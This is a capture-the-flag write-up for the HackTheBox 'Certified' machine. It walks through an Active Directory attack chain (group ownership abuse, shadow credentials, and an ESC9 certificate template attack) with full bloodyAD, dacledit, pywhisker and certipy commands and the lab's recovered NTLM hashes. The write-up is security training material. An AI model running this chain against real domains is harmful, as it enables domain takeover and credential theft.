# Certified -- HackTheBox (write-up)

**Difficulty:** Medium
**Box:** Certified (HackTheBox)
**Author:** dsec
**Date:** 2025-12-11

---

## TL;DR

### AD certificate abuse chain. Started with provided creds, abused ownership + WriteMember permissions to join the Management group, used pywhisker for shadow credentials on management_svc, then ESC9 certificate attack through ca_operator to get Administrator hash.
---
## Target info

- Host: `10.129.239.104` / `10.10.11.41`
- Domain: `certified.htb`
---
## Enumeration

![Nmap results](images/certified-htb_1.png)

![SMB enumeration](images/certified-htb_2.png)

![LDAP enumeration](images/certified-htb_3.png)

![Domain info](images/certified-htb_4.png)

![BloodHound](images/certified-htb_5.png)

Starting creds: `judith.mader:judith09`

![Initial access](images/certified-htb_6.png)

![AD enumeration](images/certified-htb_7.png)

---
## Step 1 -- Take ownership of Management group

Set judith as owner of the Management group:

![Set owner](images/certified-htb_8.png)

```bash
bloodyAD -d certified.htb -u judith.mader -p judith09 --host 10.129.239.104 set owner "CN=Management,CN=Users,DC=certified,DC=htb" "CN=Judith Mader,CN=Users,DC=certified,DC=htb"
```

---
## Step 2 -- Add judith to Management group

Write member permissions:

![Write perms](images/certified-htb_9.png)

```bash
python3 dacledit.py -dc-ip 10.129.239.104 -u certified.htb/judith.mader:judith09 -target-dn "CN=Management,CN=Users,DC=certified,DC=htb" -principal-dn "CN=Judith Mader,CN=Users,DC=certified,DC=htb" -action write -rights WriteMembers
```

Immediately add to group:

![Add to group](images/certified-htb_10.png)

```bash
bloodyAD -d certified.htb -u judith.mader -p judith09 --host 10.129.239.104 add groupMember "CN=Management,CN=Users,DC=certified,DC=htb" "CN=Judith Mader,CN=Users,DC=certified,DC=htb"
```

Verified:

![Verify membership](images/certified-htb_11.png)

```bash
bloodyAD -d certified.htb -u judith.mader -p judith09 --host 10.129.239.104 get object "CN=Management,CN=Users,DC=certified,DC=htb"
```

---
## Step 3 -- Shadow credentials on management_svc

![BloodHound path](images/certified-htb_12.png)

```bash
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
```

![Pywhisker](images/certified-htb_13.png)

![Certificate generated](images/certified-htb_14.png)

Converted to PFX:

```bash
openssl pkcs12 -export -out management_svc_cert.pfx -inkey management_svc_cert.pem_priv.pem -in management_svc_cert.pem_cert.pem -nodes -password pass:
```

---
## Step 4 -- Fix clock skew and authenticate

![Clock skew error](images/certified-htb_15.png)

```bash
sudo systemctl stop systemd-timesyncd
sudo ntpdate -u 10.129.239.104
certipy auth -pfx management_svc_cert.pfx -u management_svc -domain certified.htb -dc-ip 10.129.239.104 -debug
```

Got management_svc hash: `aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584`

![Hash obtained](images/certified-htb_16.png)

![WinRM access](images/certified-htb_17.png)

---
## Step 5 -- Certipy enumeration

```bash
certipy find -dc-ip 10.10.11.41 -ns 10.10.11.41 -u management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -vulnerable -stdout
```

![Vulnerable templates](images/certified-htb_18.png)

![ESC9 found](images/certified-htb_19.png)

![Shell attempt 1](images/certified-htb_20.png)

![Shell attempt 2](images/certified-htb_21.png)

Initial shell attempts failed.

---
## Step 6 -- Shadow credentials on ca_operator

Used management_svc's GenericAll over ca_operator to write shadow credentials and get ca_operator's NTLM hash:

```bash
certipy shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.10.11.41
```

![Shadow creds](images/certified-htb_22.png)

ca_operator hash: `259745cb123a52aa2e693aaacca2db52`

---
## Step 7 -- ESC9 attack

![ESC9 template](images/certified-htb_23.png)

Reference: <https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7>

ESC9 conditions:
- StrongCertificateBindingEnforcement not set to 2 (default: 1) or CertificateMappingMethods contains UPN flag
- Certificate contains CT_FLAG_NO_SECURITY_EXTENSION flag in msPKI-Enrollment-Flag
- Certificate specifies any client authentication EKU
- Attacker has GenericWrite over another account

Changed ca_operator's UPN to Administrator (not `Administrator@domain` -- that would conflict):

```bash
certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41
```

![UPN change](images/certified-htb_24.png)

Requested certificate as ca_operator using the vulnerable template:

```bash
certipy req -u ca_operator -hashes :259745cb123a52aa2e693aaacca2db52 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
```

![Cert request](images/certified-htb_25.png)

Had to run commands in quick succession:

![Quick commands](images/certified-htb_26.png)

![Auth error](images/certified-htb_27.png)

Changed ca_operator UPN back to original:

```bash
certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41
```

![UPN restore](images/certified-htb_28.png)

Kept syncing the clock until the hash came through:

![Admin hash](images/certified-htb_29.png)

Administrator hash: `aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34`

---
## Extra notes

When dealing with clock skew, use faketime to create a synced shell instead of repeatedly running ntpdate:

```bash
faketime -f $(ntpdate -q dc | awk '{print $4}') zsh -l
```

---
## Lessons & takeaways

- AD certificate abuse chains can be long -- ownership -> group membership -> shadow credentials -> ESC9
- ESC9 works by changing a user's UPN to Administrator before requesting a certificate
- Clock skew is a common issue with Kerberos -- sync with the DC or use faketime
- The `faketime` trick avoids having to change system time and re-sync repeatedly
---
